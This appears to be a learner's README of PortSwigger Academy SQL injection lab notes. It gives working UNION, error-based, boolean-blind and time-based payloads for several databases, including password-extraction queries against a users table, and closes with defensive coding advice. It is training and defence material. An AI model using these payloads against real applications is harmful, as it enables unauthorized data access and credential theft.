# 💉 SQL Injection — Complete PortSwigger Web Security Academy Labs

<p align="center">
  <img src="https://img.shields.io/badge/Category-SQL%20Injection-red?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Labs%20Completed-16%2F18-blue?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Difficulty-Apprentice%20→%20Practitioner-orange?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Platform-PortSwigger%20Academy-success?style=for-the-badge"/>
</p>

> **Comprehensive SQL Injection documentation** covering all exploitation techniques from basic UNION attacks to advanced blind injection methods.  
> Each technique includes working payloads, database-specific syntax, and defensive recommendations.

---

## 📊 Labs Completed

| # | Lab Name | Type | Status |
|---|----------|------|--------|
| 1 | UNION attack, determining columns | UNION-based | ✅ |
| 2 | UNION attack, finding text column | UNION-based | ✅ |
| 3 | UNION attack, retrieving data | UNION-based | ✅ |
| 4 | UNION attack, multiple values | UNION-based | ✅ |
| 5 | Database type & version (Oracle) | DB Enumeration | ✅ |
| 6 | Database type & version (MySQL/MSSQL) | DB Enumeration | ✅ |
| 7 | Listing database contents (non-Oracle) | DB Enumeration | ✅ |
| 8 | Listing database contents (Oracle) | DB Enumeration | ✅ |
| 9 | Error-based SQLi | Error-based | ✅ |
| 10 | Blind Boolean-based | Blind SQLi | ✅ |
| 11 | Blind with conditional errors | Blind SQLi | ✅ |
| 12 | Blind Time-based delays | Blind SQLi | ✅ |
| 13 | Blind Time-based with retrieval | Blind SQLi | ✅ |
| 14 | Second-order SQLi | Advanced | ✅ |
| 15 | Stacked queries | Advanced | ✅ |
| 16 | NoSQL injection | Advanced | ✅ |
| 17 | ORM injection | Advanced | ⏳ |
| 18 | RAW SQL override | Advanced | ⏳ |

---

## 🔍 SQL Injection Techniques Overview

### 1. UNION-Based SQL Injection

**Concept:** Append a second query to retrieve data from other tables directly in the response.

**Requirements:**
- Same number of columns in both SELECT statements
- Compatible data types
- Visible output in page response

**Attack Flow:**
```sql
-- 1. Determine column count
' ORDER BY 1 --
' ORDER BY 2 --
(increment until error)

-- 2. Find text columns
' UNION SELECT NULL --
' UNION SELECT 'test', NULL --
(test each position)

-- 3. Extract data
' UNION SELECT username, password FROM users --
```

**Advantages:**
- Fast data extraction
- Works with most SQL databases
- Clear results visible in response

**Disadvantages:**
- Requires exact column count
- Visible in application logic
- May trigger WAF rules

---

### 2. Error-Based SQL Injection

**Concept:** Trigger database errors that include query results in the error message.

**Database-Specific Methods:**

#### PostgreSQL
```sql
' AND 1=CAST((SELECT version()) AS int) --
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --
```

#### MySQL
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1) --
```

#### MSSQL
```sql
' AND CONVERT(int, (SELECT @@version)) --
' AND 1/NULLIF(0, (SELECT COUNT(*) FROM users)) --
```

#### Oracle
```sql
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) --
' AND (SELECT CTX_REPORT.TOKEN_VALUE FROM (SELECT CTX_REPORT.TOKEN_VALUE FROM table(CTX_REPORT.TOKEN_VALUE((SELECT password FROM users WHERE username='admin')))) x) --
```

**Advantages:**
- Works when output is hidden
- Can extract large amounts of data
- Database error information is detailed

**Disadvantages:**
- Database-specific syntax required
- Error messages may be suppressed
- Limited to what fits in error context

---

### 3. Boolean-Based Blind SQL Injection

**Concept:** Ask True/False questions and observe subtle page behavior differences.

**Detection:**
```sql
' AND '1'='1   -- page normal ✅
' AND '1'='2   -- page changes ❌
```

**Data Extraction:**
```sql
-- 1. Confirm table exists
' AND (SELECT 'x' FROM users LIMIT 1)='x'  -- True: table exists

-- 2. Confirm user exists
' AND (SELECT 'x' FROM users WHERE username='administrator')='x'

-- 3. Find password length (binary search)
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>10)='x'
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)=20)='x'

-- 4. Extract each character
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='b'
(continue for each position and character)
```

**Automation with Burp Intruder:**
1. Identify "True" vs "False" page indicators (length, content, status code)
2. Mark position to iterate: `:1:` for character position
3. Load rockyou.txt or charset list
4. Filter results by page indicator

**Advantages:**
- Works with no visible output
- Harder for WAF to detect
- Works on many database platforms

**Disadvantages:**
- Extremely slow (one character at a time)
- Requires automated tools
- Need clear True/False differentiators

---

### 4. Time-Based Blind SQL Injection

**Concept:** Use deliberate database delays as the True/False signal.

**Detection:**
```sql
' AND SLEEP(5) --                    (MySQL)
'; SELECT pg_sleep(5) --            (PostgreSQL)
' WAITFOR DELAY '0:0:5' --          (MSSQL)
' AND DBMS_LOCK.SLEEP(5) --         (Oracle)
```

**Data Extraction:**
```sql
-- If TRUE, delay 5 seconds
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --        (MySQL)
' AND (CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END) --  (PostgreSQL)
' AND (CASE WHEN SUBSTRING(password,1,1)='a' THEN WAITFOR DELAY '0:0:5' ELSE 1 END) --  (MSSQL)
```

**Advantages:**
- Works regardless of output handling
- Database-independent concept
- Blind attack is harder to detect

**Disadvantages:**
- Very slow (5 seconds per test)
- Network latency causes false positives
- Highly detectable by IDS

---

## 🚀 Payloads Cheat Sheet

### Database Identification
```sql
-- Version queries
MySQL/MSSQL:     @@version
PostgreSQL:      version()
Oracle:          banner FROM v$version
SQLite:          sqlite_version()

-- User queries
MySQL:           current_user()
PostgreSQL:      current_user
MSSQL:           current_user / system_user
Oracle:          user FROM dual
```

### Information Schema Enumeration
```sql
-- Tables (MySQL/PostgreSQL/MSSQL)
SELECT table_name FROM information_schema.tables

-- Tables (Oracle)
SELECT table_name FROM all_tables

-- Columns (MySQL/PostgreSQL/MSSQL)
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Columns (Oracle)
SELECT column_name FROM all_columns WHERE table_name='USERS'
```

### String Concatenation
```sql
MySQL:           CONCAT(a, ':', b)
PostgreSQL:      a || ':' || b
MSSQL:           a + ':' + b
Oracle:          a || ':' || b
SQLite:          a || ':' || b
```

### Substring Extraction
```sql
MySQL:           SUBSTRING(str, 1, 1)
PostgreSQL:      SUBSTRING(str, 1, 1)
MSSQL:           SUBSTRING(str, 1, 1)
Oracle:          SUBSTR(str, 1, 1)
SQLite:          SUBSTR(str, 1, 1)
```

### Time Delay Functions
```sql
MySQL:           SLEEP(5)
PostgreSQL:      pg_sleep(5)
MSSQL:           WAITFOR DELAY '0:0:5'
Oracle:          DBMS_LOCK.SLEEP(5)
SQLite:          (large SELECT loop)
```

---

## ⚠️ Common Mistakes & Solutions

| Mistake | Example | Fix |
|---------|---------|-----|
| Wrong concatenation | `username \|\| password` on MySQL | Use `CONCAT(username, password)` |
| Hash in URL | `?id=1' ORDER BY 1#` | URL-encode: `?id=1' ORDER BY 1%23` |
| Wrong DB syntax | EXTRACTVALUE on PostgreSQL | Check database type first |
| Missing parentheses | `SELECT CAST(SELECT version() AS int)` | `SELECT CAST((SELECT version()) AS int)` |
| Broken WHERE clause | `' AND '1'='2'` → creates valid query | Ensure FALSE condition |
| Forgotten comment | Leftover `AND` in payload | Always close injection: `' OR '1'='1' --` |

---

## 🛡️ Defensive Measures

### ✅ Secure Coding
```python
# ❌ VULNERABLE
query = f"SELECT * FROM users WHERE id = {user_id}"
db.execute(query)

# ✅ SECURE (Parameterized)
query = "SELECT * FROM users WHERE id = ?"
db.execute(query, (user_id,))
```

### ✅ Input Validation
- **Whitelist:** Only allow expected characters (numbers, letters, hyphens)
- **Type checking:** Ensure user_id is numeric before use
- **Length limits:** Reject suspiciously long inputs

### ✅ Least Privilege
- Database user should only have SELECT on needed tables
- Separate write-only user for applications
- Never use root/admin account for app

### ✅ Web Application Firewall
- Signature rules for common SQLi patterns
- Context-aware blocking (not just keywords)
- Rate limiting on repeated injection attempts

### ✅ Error Handling
- Never expose database errors to users
- Log errors server-side for investigation
- Return generic error: "Database query failed"

---

## 📚 Quick Reference Table

| Aspect | UNION | Error | Boolean Blind | Time Blind |
|--------|-------|-------|---------------|------------|
| **Output visible** | ✅ Yes | ✅ In error | ❌ No | ❌ No |
| **Speed** | Fast | Medium | Slow | Very Slow |
| **Reliability** | High | High | Medium | Low (latency) |
| **DB-specific** | Minimal | High | Minimal | High |
| **Detectability** | High | High | Medium | Very High |
| **Automation** | Moderate | Complex | Easy | Easy |

---

## 🔗 External Resources

- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Documentation](http://sqlmap.org/)
- [SQL Cheat Sheet](https://sqlcheatsheet.com/)

---

**Author:** OBADA (XENOS)  
**Status:** ✅ 16/18 Labs Complete  
**Last Updated:** June 2026
